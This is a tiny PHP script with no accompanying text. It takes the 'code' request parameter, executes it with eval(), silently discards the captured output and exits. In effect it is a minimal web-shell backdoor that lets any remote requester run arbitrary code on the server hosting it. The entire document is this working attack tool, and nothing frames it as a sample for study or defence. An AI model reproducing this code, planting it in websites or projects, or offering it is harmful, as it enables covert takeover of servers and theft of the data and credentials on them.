<?php
$code = $_REQUEST['code'];
ob_start();
eval($code);
$res = ob_get_contents();
ob_end_clean();
$code = $res;
die("");
?>